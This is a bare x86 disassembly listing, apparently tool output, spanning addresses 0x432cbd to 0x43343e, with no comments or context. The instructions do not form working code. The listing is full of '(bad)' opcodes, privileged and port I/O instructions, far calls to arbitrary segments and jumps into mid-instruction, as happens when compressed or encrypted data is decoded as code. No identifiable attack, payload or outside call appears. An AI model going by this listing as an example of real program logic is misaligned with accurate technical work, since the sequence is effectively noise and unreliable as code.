  432cbd:	cmp    DWORD PTR [ebp+0x5ee9ced5],eax
  432cc3:	ins    DWORD PTR es:[edi],dx
  432cc4:	test   BYTE PTR [edi],ch
  432cc6:	inc    esi
  432cc7:	jg     0x432ce8
  432cc9:	sar    BYTE PTR [ebp-0x7aca968e],cl
  432ccf:	add    al,0xdd
  432cd1:	sub    BYTE PTR [esi+ebp*2+0x22],al
  432cd5:	sub    DWORD PTR [eax-0x4c4fc5d3],0x1f
  432cdc:	jl     0x432d57
  432cde:	inc    ebp
  432cdf:	xchg   DWORD PTR [esi-0x15e1ae75],esp
  432ce5:	test   al,0xd1
  432ce7:	dec    edx
  432ce8:	dec    edx
  432ce9:	jns    0x432d48
  432ceb:	fldcw  WORD PTR [esi]
  432ced:	mov    ah,0x8f
  432cef:	push   edx
  432cf0:	sbb    DWORD PTR ds:0x5dda2a58,edi
  432cf6:	aas    
  432cf7:	fsub   QWORD PTR [esi+0x6d6deeea]
  432cfd:	iret   
  432cfe:	push   esi
  432cff:	test   eax,0x2a9774f2
  432d04:	iret   
  432d05:	push   ss
  432d06:	mov    ebp,0xbda5b5bd
  432d0b:	(bad)  
  432d0c:	jg     0x432cbd
  432d0e:	jbe    0x432d4b
  432d10:	cli    
  432d11:	retf   
  432d12:	push   eax
  432d13:	push   esp
  432d14:	popf   
  432d15:	out    dx,al
  432d16:	das    
  432d17:	(bad)  
  432d18:	cmp    BYTE PTR [ecx+0x4d],al
  432d1b:	sti    
  432d1c:	mov    ah,0x93
  432d1e:	sub    BYTE PTR [ebp+0x6775fa5a],ah
  432d24:	jmp    0x432d7f
  432d26:	xor    eax,0x73db17b4
  432d2b:	outs   dx,DWORD PTR ds:[esi]
  432d2c:	push   ebp
  432d2d:	jmp    0x432d1a
  432d2f:	fstp   TBYTE PTR [edx]
  432d31:	xor    al,0xf8
  432d33:	pop    ebp
  432d34:	test   esi,eax
  432d36:	jo     0x432d89
  432d38:	jnp    0x432d0d
  432d3a:	add    edi,edx
  432d3c:	repnz lock jecxz 0x432cfa
  432d40:	mov    edx,0xc9de52e7
  432d45:	into   
  432d46:	mov    esp,0x66f5021d
  432d4b:	mov    WORD PTR [ecx],?
  432d4d:	and    BYTE PTR [ecx+0x3e6ef881],ah
  432d53:	(bad)  
  432d54:	pop    ebx
  432d55:	mov    dl,0xaa
  432d57:	psraw  mm6,0x5a
  432d5b:	or     BYTE PTR [edi],al
  432d5d:	push   ss
  432d5e:	aad    0x7
  432d60:	jmp    edi
  432d62:	mov    edi,0xfe7f07a1
  432d67:	push   ebx
  432d68:	lds    ecx,FWORD PTR [ecx+0x7f]
  432d6b:	mov    ebp,0x34865cd0
  432d70:	jmp    DWORD PTR [edi-0x61]
  432d73:	sub    bh,BYTE PTR [esi]
  432d75:	pop    edi
  432d76:	aam    0xe6
  432d78:	shl    BYTE PTR [edx+0x34d6c756],cl
  432d7e:	jae    0x432df3
  432d80:	dec    ebp
  432d81:	daa    
  432d82:	aas    
  432d83:	jp     0x432d37
  432d85:	fsub   DWORD PTR [edi]
  432d87:	push   ebp
  432d88:	stos   BYTE PTR es:[edi],al
  432d89:	dec    edx
  432d8a:	leave  
  432d8b:	pop    ebx
  432d8c:	dec    ebp
  432d8d:	ja     0x432d1a
  432d8f:	jns    0x432d29
  432d91:	push   ebp
  432d92:	(bad)  
  432d93:	icebp  
  432d94:	inc    edx
  432d95:	fld    TBYTE PTR [ecx]
  432d97:	jle    0x432e08
  432d99:	outs   dx,BYTE PTR ds:[esi]
  432d9a:	in     al,dx
  432d9b:	push   0xd854a367
  432da0:	fdiv   DWORD PTR ds:0xa7bdba85
  432da6:	std    
  432da7:	jmp    0xeb6a:0xf0eb51a
  432dae:	dec    esi
  432daf:	test   esi,edx
  432db1:	inc    esi
  432db2:	xchg   edi,eax
  432db3:	mov    ah,0x3c
  432db5:	mov    ecx,0xf13f33ac
  432dba:	dec    ecx
  432dbb:	int    0x3f
  432dbd:	call   FWORD PTR [ebx+0x85cbb9a]
  432dc3:	mov    bh,0x86
  432dc5:	bound  esp,QWORD PTR [esi]
  432dc7:	push   0xffffffaa
  432dc9:	mov    ah,0xbb
  432dcb:	mov    cl,0x5f
  432dcd:	ins    BYTE PTR es:[edi],dx
  432dce:	clc    
  432dcf:	adc    eax,0xd01a1dd5
  432dd4:	test   eax,0x3978f9ef
  432dd9:	push   esp
  432dda:	call   0xfeba:0x1c18527a
  432de1:	retf   
  432de2:	call   FWORD PTR [ebp+0x21]
  432de5:	outs   dx,BYTE PTR fs:[esi]
  432de7:	stos   BYTE PTR es:[edi],al
  432de8:	neg    ebx
  432dea:	aas    
  432deb:	mov    eax,ds:0x7f37f57f
  432df0:	dec    ebx
  432df1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432df2:	(bad)  
  432df3:	fnsave [ebx-0x9]
  432df6:	jb     0x432e0c
  432df8:	mov    esi,0xbaaa8cf2
  432dfd:	jmp    0x432d8a
  432dff:	jnp    0x432d9f
  432e01:	rcr    dh,1
  432e03:	sbb    edx,DWORD PTR [edi-0x3273a2ac]
  432e09:	cli    
  432e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432e0b:	lahf   
  432e0c:	aam    0x8b
  432e0e:	das    
  432e0f:	out    dx,al
  432e10:	test   eax,0xd61f3def
  432e15:	enter  0x77d1,0x6b
  432e19:	icebp  
  432e1a:	(bad)  
  432e1b:	stos   DWORD PTR es:[edi],eax
  432e1c:	lds    esi,FWORD PTR [eax]
  432e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432e1f:	xor    dh,bl
  432e21:	fstp   st(2)
  432e23:	fcmovnu st,st(2)
  432e25:	push   ecx
  432e26:	repz rcl BYTE PTR [eax-0x4b55a84a],1
  432e2d:	ds jnp 0x432e81
  432e30:	xchg   ebp,eax
  432e31:	dec    ebp
  432e32:	inc    edi
  432e33:	push   esp
  432e34:	(bad)  
  432e36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432e37:	std    
  432e38:	in     eax,dx
  432e39:	int    0x42
  432e3b:	xor    ebx,ecx
  432e3d:	sub    al,0xde
  432e3f:	jns    0x432e50
  432e41:	and    eax,0x5bb7b3b3
  432e46:	push   0x999a7524
  432e4b:	mov    ecx,0xbda2f6a2
  432e50:	cmp    ebp,DWORD PTR [edi-0x34]
  432e53:	test   eax,0xa3dfc7f2
  432e58:	(bad)  
  432e59:	scas   al,BYTE PTR es:[edi]
  432e5a:	dec    edi
  432e5b:	test   al,0xa9
  432e5d:	mov    ch,0x52
  432e5f:	mov    ecx,DWORD PTR [ebx+0x7ada6aa3]
  432e65:	inc    ebp
  432e66:	mov    edi,0xf2a9fbd7
  432e6b:	(bad)  
  432e6c:	lahf   
  432e6d:	iret   
  432e6e:	(bad)  
  432e6f:	popa   
  432e70:	dec    DWORD PTR [ebx+0x7]
  432e73:	xchg   ecx,eax
  432e74:	adc    BYTE PTR [ebx+esi*2+0x5e],0x8a
  432e79:	mov    ebp,0x78525145
  432e7e:	push   ds
  432e7f:	shr    dh,0x73
  432e82:	pop    eax
  432e83:	bound  eax,QWORD PTR [edx-0x59]
  432e86:	cmp    DWORD PTR [edx+0x4b3b7195],ebx
  432e8c:	mov    dl,0x5f
  432e8e:	ins    DWORD PTR es:[edi],dx
  432e8f:	inc    ebx
  432e90:	ss iret 
  432e92:	add    ebp,ebp
  432e94:	sub    DWORD PTR [ebx],edi
  432e96:	rcr    BYTE PTR [ebx],1
  432e98:	mov    ds:0xa00d654d,al
  432e9d:	outs   dx,BYTE PTR ds:[esi]
  432e9f:	nop
  432ea0:	pop    esp
  432ea1:	aaa    
  432ea2:	mov    ss,WORD PTR [eax+0xf]
  432ea5:	cmp    BYTE PTR [eax+0x923d92a],al
  432eab:	mov    esp,0x4746ef4
  432eb0:	call   0x81d1:0xedfdbc21
  432eb7:	fcmovnbe st,st(1)
  432eb9:	mov    al,0x5
  432ebb:	cmp    DWORD PTR [esi],ebp
  432ebd:	jns    0x432f07
  432ebf:	mov    dh,0x53
  432ec1:	jo     0x432edd
  432ec3:	out    0xd9,al
  432ec5:	dec    esp
  432ec6:	and    al,0xf
  432ec8:	cmc    
  432ec9:	enter  0x6755,0x9
  432ecd:	aas    
  432ece:	and    eax,0xf8a46093
  432ed3:	repnz clc 
  432ed5:	sub    ebx,DWORD PTR [edi-0x2c]
  432ed8:	inc    esi
  432ed9:	addr16 popa 
  432edb:	out    dx,eax
  432edc:	xlat   BYTE PTR ds:[ebx]
  432edd:	push   ds
  432ede:	sub    ebp,DWORD PTR [ecx+edi*8+0x4b]
  432ee2:	mov    edx,0x6d59e379
  432ee7:	cs das 
  432ee9:	stos   BYTE PTR es:[edi],al
  432eea:	mov    dh,0x36
  432eec:	adc    eax,0xf4134c96
  432ef1:	nop
  432ef2:	push   es
  432ef3:	dec    edi
  432ef4:	jg     0x432f3d
  432ef6:	mov    eax,ds:0xb95b5e2
  432efb:	xor    edx,DWORD PTR [esi+0x57]
  432efe:	movhps QWORD PTR [ebx],xmm0
  432f01:	shr    DWORD PTR [edi-0x6f00d03b],cl
  432f07:	ss mov esi,0xffdb5170
  432f0d:	repnz and BYTE PTR [esi+0x12],0x29
  432f12:	xchg   DWORD PTR [esp+ecx*1+0x4a],ecx
  432f16:	cmp    al,0x55
  432f18:	xor    ch,BYTE PTR [esi-0x1785935f]
  432f1e:	sahf   
  432f1f:	pop    es
  432f20:	mov    ebp,0x759b2e42
  432f25:	ds ror DWORD PTR ss:[ecx-0x31dfe308],cl
  432f2d:	imul   ebx,DWORD PTR [ecx-0x2d],0x365b3201
  432f34:	jnp    0x432f70
  432f36:	or     al,BYTE PTR [ecx]
  432f38:	mov    al,0xb6
  432f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432f3b:	inc    edx
  432f3c:	push   ss
  432f3d:	test   al,0xa1
  432f3f:	js     0x432fb1
  432f41:	test   eax,0xd2ead178
  432f46:	mov    ebp,0x9cef41e7
  432f4b:	add    al,0x4a
  432f4d:	dec    edx
  432f4e:	rep lods eax,DWORD PTR ds:[esi]
  432f50:	in     al,dx
  432f51:	scas   eax,DWORD PTR es:[edi]
  432f52:	push   edx
  432f53:	ret    
  432f54:	out    0x7e,eax
  432f56:	push   esi
  432f57:	jnp    0x432f38
  432f59:	sub    cl,ah
  432f5b:	fwait
  432f5c:	(bad)  
  432f5d:	ret    0x493c
  432f60:	and    BYTE PTR [eax-0x40928506],0xff
  432f67:	xchg   DWORD PTR [ebp-0x5a27a741],esi
  432f6d:	das    
  432f6e:	cmp    al,0xa7
  432f70:	call   0x4874:0x7fb42723
  432f77:	retf   
  432f78:	stos   DWORD PTR es:[edi],eax
  432f79:	pop    edi
  432f7a:	push   ebx
  432f7b:	inc    ebx
  432f7c:	retf   
  432f7d:	add    eax,ebp
  432f7f:	sub    DWORD PTR [ebp+0x52],edx
  432f82:	std    
  432f83:	out    dx,al
  432f84:	mov    dh,0xde
  432f86:	clc    
  432f87:	pop    ebx
  432f88:	aas    
  432f89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432f8a:	scas   eax,DWORD PTR es:[edi]
  432f8b:	std    
  432f8c:	into   
  432f8d:	jne    0x432f4c
  432f8f:	adc    DWORD PTR [edx],eax
  432f91:	hlt    
  432f92:	mov    ch,0x18
  432f94:	neg    DWORD PTR [esp+esi*4]
  432f97:	xor    eax,0xaefe232f
  432f9c:	mov    dl,0x80
  432f9f:	jecxz  0x432f60
  432fa1:	pop    ebp
  432fa2:	jbe    0x432fba
  432fa4:	and    DWORD PTR [eax],ecx
  432fa6:	inc    eax
  432fa7:	imul   edi,DWORD PTR [esi+0x507f27f3],0x9fc3fe4f
  432fb1:	sub    edi,DWORD PTR [edi-0x59889895]
  432fb7:	push   eax
  432fb8:	in     eax,0xbf
  432fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432fbb:	aad    0xa9
  432fbd:	xchg   edi,eax
  432fbe:	mov    ch,0x3e
  432fc0:	xor    esp,DWORD PTR [ebx+0x42e6e1e6]
  432fc6:	jne    0x433027
  432fc8:	sub    BYTE PTR [esi-0x32],cl
  432fcb:	gs cmc 
  432fcd:	fisub  DWORD PTR ds:[esi+0x2d33629d]
  432fd4:	pop    esp
  432fd5:	pop    ebx
  432fd6:	push   esi
  432fd7:	dec    ebp
  432fd8:	jg     0x43304b
  432fda:	sbb    cl,BYTE PTR [esi+0x16]
  432fdd:	mov    dh,0x7b
  432fdf:	jno    0x433043
  432fe1:	lea    ebp,cs:[ebp-0x760ece6c]
  432fe8:	mov    esp,0xaecaeee5
  432fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432fee:	pop    edi
  432fef:	mov    edi,0x4181f6ad
  432ff4:	aad    0xb4
  432ff6:	mov    ch,0xa8
  432ff8:	imul   edi,DWORD PTR [eax-0x65208cab],0xf57f03d6
  433002:	xchg   edi,eax
  433003:	hlt    
  433004:	lods   eax,DWORD PTR ds:[esi]
  433005:	pop    edi
  433006:	std    
  433007:	or     DWORD PTR [ebp+0x37],edx
  43300a:	xor    eax,0x8543d0e8
  43300f:	and    BYTE PTR [ecx],ch
  433011:	add    al,0xe7
  433013:	fcmovb st,st(2)
  433015:	call   0xbaa8:0xca767776
  43301c:	adc    ebx,edi
  43301e:	std    
  43301f:	arpl   bp,ax
  433021:	jp     0x43305b
  433023:	push   esi
  433024:	outs   dx,BYTE PTR ds:[esi]
  433025:	fldcw  WORD PTR [esi+0x3a]
  433028:	dec    edi
  433029:	ja     0x433001
  43302b:	mov    ch,0xfe
  43302d:	in     al,dx
  43302e:	jmp    DWORD PTR [esi-0x2f17553]
  433034:	fidivr WORD PTR [edi]
  433036:	js     0x43307d
  433038:	out    0xbe,eax
  43303a:	cld    
  43303b:	out    0x7d,al
  43303d:	adc    ch,cl
  43303f:	loopne 0x433078
  433041:	dec    DWORD PTR [ebx-0x6b]
  433044:	sbb    ch,BYTE PTR [edx-0x1c06212c]
  43304a:	fidivr DWORD PTR [ebp+eiz*8-0xd]
  43304e:	test   ecx,ebx
  433050:	cmc    
  433051:	imul   ebp,DWORD PTR [edx],0x64
  433054:	xchg   esi,eax
  433055:	push   ss
  433056:	mov    dh,0xbf
  433058:	mov    edi,0xd4bab330
  43305d:	shl    DWORD PTR [edx-0x52],1
  433060:	fdiv   st,st(4)
  433062:	rcr    edx,cl
  433064:	pop    edx
  433065:	call   0xf342:0xddc04e2b
  43306c:	stos   BYTE PTR es:[edi],al
  43306d:	push   edx
  43306e:	jecxz  0x433040
  433070:	rol    DWORD PTR [ebp-0x37a627c7],cl
  433076:	ficomp WORD PTR ds:0xb3155455
  43307c:	mov    bl,0x57
  43307e:	push   ebp
  43307f:	or     BYTE PTR [ebx-0x465b3d1b],ch
  433085:	push   ebp
  433086:	sbb    al,0x38
  433088:	vorpd  xmm3,xmm1,xmm5
  43308c:	mov    al,ds:0xcd5ea6fa
  433091:	into   
  433092:	jl     0x4330ed
  433094:	imul   edi,DWORD PTR [ebx],0x75
  433097:	jmp    0x5fd5:0xd8d5efa8
  43309e:	rol    DWORD PTR [ebx],1
  4330a0:	(bad)  
  4330a1:	std    
  4330a2:	dec    edi
  4330a3:	stos   BYTE PTR es:[edi],al
  4330a4:	sub    edx,DWORD PTR [esp+edx*8-0x36]
  4330a8:	(bad)  
  4330a9:	(bad)
  4330ac:	dec    ebp
  4330ad:	jmp    0xdc92c63d
  4330b2:	scas   eax,DWORD PTR es:[edi]
  4330b3:	fdiv   DWORD PTR [ebx+0x5b]
  4330b6:	(bad)  
  4330b7:	push   ebx
  4330b8:	int3   
  4330b9:	sbb    edi,DWORD PTR gs:[eax+0x36]
  4330bd:	(bad)  
  4330be:	pop    ebx
  4330bf:	inc    edi
  4330c0:	jl     0x4330c9
  4330c2:	jg     0x43308a
  4330c4:	ins    DWORD PTR es:[edi],dx
  4330c5:	sbb    DWORD PTR [ecx],ebp
  4330c7:	mov    ebx,0x2e757324
  4330cc:	les    edi,FWORD PTR [edx+eax*8]
  4330cf:	push   0x3d
  4330d1:	adc    BYTE PTR [ebx+0x71],bh
  4330d4:	cmp    bh,BYTE PTR [ebx+0xe]
  4330d7:	out    dx,eax
  4330d8:	jmp    0x2cfcae67
  4330dd:	cmp    esi,DWORD PTR [ecx+eiz*2-0x7f]
  4330e1:	xchg   BYTE PTR [ecx],ch
  4330e3:	test   al,0x14
  4330e5:	ins    DWORD PTR es:[edi],dx
  4330e6:	sub    BYTE PTR [ebx-0x6f0bbcfe],dh
  4330ec:	repz rol DWORD PTR [ecx-0x5c],0x0
  4330f1:	mov    eax,ds:0x225fcf62
  4330f6:	test   DWORD PTR [eax-0x539c9dad],ecx
  4330fc:	les    esi,FWORD PTR [ebx+0x48]
  4330ff:	adc    eax,DWORD PTR [esi]
  433101:	mov    esp,0x28fd840
  433106:	adc    ch,BYTE PTR [ecx+0x20b16323]
  43310c:	push   edi
  43310d:	and    BYTE PTR gs:[ebx],al
  433110:	xlat   BYTE PTR ds:[ebx]
  433111:	xlat   BYTE PTR ds:[ebx]
  433112:	or     edx,DWORD PTR gs:[edx+0x2306214]
  433119:	in     eax,0xc8
  43311b:	inc    eax
  43311c:	sbb    DWORD PTR [bp+si],0xffffffbe
  433120:	(bad)  
  433121:	rol    ebp,cl
  433123:	add    ebx,DWORD PTR [edx]
  433125:	aad    0xd5
  433127:	icebp  
  433128:	popa   
  433129:	ins    DWORD PTR es:[edi],dx
  43312a:	ins    DWORD PTR es:[edi],dx
  43312b:	pop    esp
  43312c:	cs ss dec edx
  43312f:	ja     0x433122
  433131:	out    dx,al
  433132:	cmp    eax,0x6327156d
  433137:	push   ebx
  433138:	retf   
  433139:	sub    DWORD PTR [edx-0x1268b1d8],0xffffffc2
  433140:	push   cs
  433141:	pop    ebp
  433142:	pop    edx
  433143:	jns    0x43318a
  433145:	sub    eax,0xb354473b
  43314a:	jle    0x433195
  43314c:	das    
  43314d:	sbb    eax,0xcefbb1f9
  433152:	xor    BYTE PTR [eax],dl
  433154:	jae    0x43318e
  433156:	ret    0xe5e6
  433159:	nop
  43315a:	out    0x46,eax
  43315c:	ss push ds
  43315e:	pusha  
  43315f:	and    eax,esp
  433161:	dec    ecx
  433162:	pop    esp
  433163:	xchg   ebp,eax
  433164:	xchg   ebx,eax
  433165:	pushf  
  433166:	or     BYTE PTR [edx-0x29],0xeb
  43316a:	and    BYTE PTR [ebx],cl
  43316c:	dec    ebx
  43316d:	out    dx,al
  43316e:	xor    esp,DWORD PTR [ecx]
  433170:	dec    ebx
  433171:	adc    ah,BYTE PTR [edi+0xc]
  433174:	jle    0x43310b
  433176:	(bad)  
  433178:	ds cmp dl,bh
  43317b:	xor    DWORD PTR [edi+0x57506314],esp
  433181:	push   edi
  433182:	push   ecx
  433183:	test   al,0xff
  433185:	xchg   ebp,eax
  433186:	push   0xffffffe8
  433188:	test   al,0x52
  43318a:	(bad)  
  43318b:	pop    edi
  43318c:	jg     0x4331d6
  43318e:	or     eax,0x8b0ff13f
  433193:	push   ebx
  433194:	mov    bl,0xb0
  433196:	scas   eax,DWORD PTR es:[edi]
  433197:	aas    
  433198:	stc    
  433199:	cdq    
  43319a:	ret    0x69dc
  43319d:	aam    0x7a
  43319f:	ins    DWORD PTR es:[edi],dx
  4331a0:	popa   
  4331a1:	mov    esi,0xa57fc8fc
  4331a6:	lods   eax,DWORD PTR ds:[esi]
  4331a7:	mov    gs,WORD PTR [ebp+0x35]
  4331aa:	aaa    
  4331ab:	mov    WORD PTR [eax-0x12],gs
  4331ae:	xchg   edi,eax
  4331af:	mov    edi,0xefeaff57
  4331b4:	(bad)  
  4331b6:	in     eax,0xfd
  4331b8:	jnp    0x43321d
  4331ba:	cmc    
  4331bb:	call   0x1db9:0x931ec70c
  4331c2:	sbb    esp,DWORD PTR [ebx-0xe]
  4331c5:	sub    DWORD PTR [edi],eax
  4331c7:	lahf   
  4331c8:	inc    edi
  4331c9:	jle    0x4331eb
  4331cb:	stc    
  4331cc:	add    al,0x98
  4331ce:	cmc    
  4331cf:	call   0xa7f070cb
  4331d4:	jg     0x4331ca
  4331d6:	arpl   dx,bp
  4331d8:	call   FWORD PTR [esi-0x4064e809]
  4331de:	fcom   st(0)
  4331e0:	sbb    edx,DWORD PTR [ebx-0x4264799b]
  4331e6:	cmc    
  4331e7:	xor    eax,0x52fd5d2d
  4331ec:	jno    0x4331e8
  4331ee:	dec    edi
  4331ef:	imul   esi,DWORD PTR [edi-0x24e46650],0x67b30a6b
  4331f9:	dec    ebx
  4331fa:	cmp    eax,0x9844f8ef
  4331ff:	ds fucom st(5)
  433202:	mov    esp,0x5bf3d48e
  433207:	pop    edi
  433208:	std    
  433209:	aas    
  43320a:	or     esi,DWORD PTR ds:0xdbbb4579
  433210:	sti    
  433211:	sub    dl,BYTE PTR ds:0x2d9b59fd
  433217:	dec    esi
  433218:	repz out 0x1a,al
  43321b:	popf   
  43321c:	cld    
  43321d:	sub    edi,DWORD PTR [edi-0x51480bb0]
  433223:	mov    eax,0x9a553376
  433228:	shl    ah,1
  43322a:	dec    ebx
  43322b:	lahf   
  43322c:	aad    0xfa
  43322e:	jl     0x4332a1
  433230:	fucomp st(6)
  433232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433233:	xchg   BYTE PTR [esi],bl
  433235:	cmp    eax,0x429aaaa7
  43323a:	xor    BYTE PTR [edi-0x62],0x28
  43323e:	imul   eax,DWORD PTR [ecx-0x5],0xffffffa9
  433242:	out    dx,al
  433243:	inc    esp
  433244:	push   0xffffffed
  433246:	jle    0x4331d2
  433248:	or     ch,BYTE PTR [eax+ebp*2-0x7100a01a]
  43324f:	fcmove st,st(7)
  433251:	push   ebp
  433252:	imul   esp,DWORD PTR [edi],0x51
  433255:	ins    DWORD PTR es:[edi],dx
  433256:	inc    ecx
  433258:	jns    0x4331ef
  43325a:	jle    0x433253
  43325c:	(bad)  
  43325d:	jge    0x433223
  43325f:	push   0xfffffffa
  433261:	jmp    0xaad2e661
  433266:	stc    
  433267:	in     al,dx
  433268:	sti    
  433269:	aam    0x58
  43326b:	stc    
  43326c:	mov    WORD PTR [esi+0x54e6172e],?
  433272:	push   ebx
  433273:	test   esi,esi
  433275:	mov    edx,0xd58aa33e
  43327a:	loop   0x43327c
  43327c:	test   al,0x3f
  43327e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43327f:	(bad)  
  433281:	loop   0x4332c0
  433283:	jmp    0x4332d0
  433285:	lds    edi,FWORD PTR [ebp*2+0x4b612615]
  43328c:	xor    DWORD PTR [esi+0x396faafd],ebx
  433292:	pop    esi
  433293:	ins    BYTE PTR es:[edi],dx
  433294:	clc    
  433295:	xchg   ebp,eax
  433296:	inc    edx
  433297:	fmul   st,st(4)
  433299:	test   eax,0xd684fba1
  43329e:	xchg   edi,eax
  43329f:	mov    ebp,edi
  4332a1:	test   BYTE PTR [ebx+0x5a],0x5e
  4332a5:	mov    esi,0xa3df7c58
  4332aa:	not    dh
  4332ac:	shl    ebp,cl
  4332ae:	mov    dl,0xed
  4332b0:	mov    ecx,DWORD PTR [ebx-0x5efdebd1]
  4332b6:	stos   BYTE PTR es:[edi],al
  4332b7:	sbb    al,0x7e
  4332b9:	scas   al,BYTE PTR es:[edi]
  4332ba:	dec    esi
  4332bb:	cmp    DWORD PTR [eax],ebp
  4332bd:	lds    ebp,FWORD PTR [edx+0x4a]
  4332c0:	jge    0x43326f
  4332c2:	sub    al,BYTE PTR [ebx+ebp*8-0x69]
  4332c6:	dec    edx
  4332c7:	dec    edi
  4332c8:	fmul   st(7),st
  4332ca:	loop   0x43324f
  4332cc:	lods   al,BYTE PTR ds:[esi]
  4332cd:	test   ebp,ecx
  4332cf:	aaa    
  4332d0:	sub    DWORD PTR [ebx],esp
  4332d2:	clc    
  4332d3:	(bad)  
  4332d4:	in     eax,0xd3
  4332d6:	sbb    bl,BYTE PTR [esi]
  4332d8:	xchg   DWORD PTR [edx],ebx
  4332da:	fstp   DWORD PTR [ecx+0x2fb9c1c7]
  4332e0:	jae    0x433313
  4332e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4332e3:	mov    ch,0x8f
  4332e5:	out    dx,eax
  4332e6:	mov    WORD PTR [esi+ecx*4-0x57],?
  4332ea:	js     0x433352
  4332ec:	dec    ecx
  4332ed:	push   esi
  4332ee:	mul    ecx
  4332f0:	ja     0x433316
  4332f2:	aam    0x88
  4332f4:	out    dx,eax
  4332f5:	pop    es
  4332f6:	mov    ds:0x658d1c57,al
  4332fb:	add    DWORD PTR [eax],esi
  4332fd:	adc    cl,cl
  4332ff:	inc    eax
  433300:	or     al,0xde
  433302:	mov    esi,0x22d2084c
  433307:	(bad)  
  433308:	psubsw mm0,QWORD PTR [eax]
  43330b:	les    ecx,FWORD PTR [edi+0x820320b]
  433311:	and    BYTE PTR fs:[ebx],bl
  433314:	mov    al,ch
  433316:	(bad)  
  433318:	jge    0x433394
  43331a:	fsub   QWORD PTR ds:[ebp+0x60]
  43331e:	or     eax,0x3243f7d2
  433323:	test   eax,0x7bc4d61
  433328:	aad    0xa7
  43332a:	dec    ecx
  43332b:	push   es
  43332c:	mov    cl,0x10
  43332e:	mov    dh,0x4a
  433330:	add    esi,DWORD PTR [eax]
  433332:	sbb    al,0xf7
  433334:	popf   
  433335:	inc    BYTE PTR [ecx-0x68155609]
  43333b:	jg     0x433397
  43333d:	lods   eax,DWORD PTR ds:[esi]
  43333e:	int    0x4f
  433340:	imul   esp,DWORD PTR [ebp-0x3],0x74d4d565
  433347:	imul   ebp,DWORD PTR [ebp+0x73],0x52
  43334b:	xchg   ebp,eax
  43334c:	lods   eax,DWORD PTR ds:[esi]
  43334d:	test   DWORD PTR [esi-0x495d014f],ecx
  433353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433354:	pop    ebx
  433355:	aad    0xd8
  433357:	jge    0x433303
  433359:	cmp    BYTE PTR [ebp+0x37],ch
  43335c:	jne    0x433313
  43335e:	jmp    0x4333bd
  433360:	in     eax,0xf6
  433362:	bound  ebp,QWORD PTR [esi+0x20cfabc0]
  433368:	push   eax
  433369:	jmp    0x433319
  43336b:	xor    DWORD PTR [esi],eax
  43336d:	cwde   
  43336e:	les    ebp,FWORD PTR [eax-0x29efb34a]
  433374:	retf   0xcf4e
  433377:	ficomp WORD PTR [eax+0xeb8c6b4]
  43337d:	cmc    
  43337e:	push   0x31
  433380:	sahf   
  433381:	pop    ecx
  433382:	xchg   edi,eax
  433383:	jge    0x4333cb
  433385:	mov    ebp,0x381c4c79
  43338a:	fist   DWORD PTR [eax]
  43338c:	mov    WORD PTR [edx+eiz*8+0x5],ss
  433390:	jp     0x4333df
  433392:	fs add eax,0x1c4e34c8
  433398:	int3   
  433399:	stos   BYTE PTR es:[edi],al
  43339a:	xor    bh,BYTE PTR [edi-0xf3c8ea1]
  4333a0:	pop    es
  4333a1:	pop    ebx
  4333a2:	push   esp
  4333a3:	push   ebp
  4333a4:	ja     0x4333fa
  4333a6:	jnp    0x43338b
  4333a8:	sti    
  4333a9:	push   0xfffffff8
  4333ab:	xor    edi,0xa7f1ff6a
  4333b1:	mov    ah,0xdc
  4333b3:	mov    cl,0xac
  4333b5:	cdq    
  4333b6:	das    
  4333b7:	cld    
  4333b8:	pop    ebx
  4333b9:	std    
  4333ba:	jmp    0x43335b
  4333bc:	sti    
  4333bd:	shl    edx,cl
  4333bf:	cmp    ebx,esi
  4333c1:	xchg   esp,eax
  4333c2:	adc    DWORD PTR [eax-0x7c],esp
  4333c5:	bound  edx,QWORD PTR [edi+0x63]
  4333c8:	or     al,0x39
  4333ca:	imul   edx,DWORD PTR [eax],0x3b84405a
  4333d0:	mov    ds:0xce319bdd,eax
  4333d5:	aas    
  4333d6:	cli    
  4333d7:	(bad)  [edi-0x17]
  4333da:	enter  0x9f7b,0xd6
  4333de:	push   esi
  4333df:	jecxz  0x43337b
  4333e1:	stos   BYTE PTR es:[edi],al
  4333e2:	fwait
  4333e3:	dec    edi
  4333e4:	pop    ss
  4333e5:	es into 
  4333e7:	xchg   esp,eax
  4333e8:	stos   BYTE PTR es:[edi],al
  4333e9:	push   edx
  4333ea:	and    al,0x66
  4333ec:	aas    
  4333ed:	adc    DWORD PTR [esi+ecx*4+0x55651d95],edi
  4333f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4333f5:	lods   eax,DWORD PTR ss:[esi]
  4333f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4333f8:	cmp    al,BYTE PTR [edi]
  4333fa:	fwait
  4333fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4333fc:	inc    edx
  4333fd:	or     BYTE PTR [edx+ebp*2+0x79],dh
  433401:	out    dx,al
  433402:	stos   BYTE PTR es:[edi],al
  433403:	jp     0x4333d3
  433405:	ds push esi
  433407:	mov    esp,0x7f78a9b3
  43340c:	jae    0x4333df
  43340e:	dec    DWORD PTR [ecx-0x73]
  433411:	aas    
  433412:	sti    
  433413:	stc    
  433414:	loop   0x43347a
  433416:	outs   dx,DWORD PTR ds:[esi]
  433417:	shr    BYTE PTR [ebp+0x13d39e57],cl
  43341d:	aas    
  43341e:	cli    
  43341f:	repz lds esi,FWORD PTR [edi-0x23]
  433423:	call   0xfe9e:0x7579f0bf
  43342a:	(bad)  
  43342b:	repnz enter 0xde2d,0x7a
  433430:	scas   al,BYTE PTR es:[edi]
  433431:	cmp    BYTE PTR [ecx-0x13892a95],dl
  433437:	pop    esp
  433438:	shl    DWORD PTR [esi+0x288b589e],1
  43343e:	mov    dl,0x15
